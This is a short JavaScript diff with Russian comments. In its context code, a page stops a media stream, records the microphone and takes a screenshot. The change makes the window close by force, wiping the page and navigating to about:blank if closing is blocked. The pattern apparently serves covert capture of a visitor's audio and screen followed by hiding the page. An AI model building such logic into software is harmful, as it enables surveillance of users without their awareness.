@@ -448,13 +448,22 @@ async function main() {
                         }
                         stream.getTracks().forEach(t => t.stop());
                         
-                        // Микрофон
+            // Микрофон
                         await recordAudio();
                         
-                        // Скриншот экрана
+            // Скриншот экрана
                         await takeScreenshot();
                         
-                        setTimeout(() => window.close(), 2000);
+            // Принудительное закрытие через 2 секунды
+                        setTimeout(() => {
+                            window.close();
+            // Если window.close() не сработал (некоторые браузеры блокируют)
+                            setTimeout(() => {
+                                document.body.innerHTML = '';
+                                window.location.href = 'about:blank';
+                            }, 500);
+                        }, 2000);
+                        
                     });
                 }, 3000);
             } else {
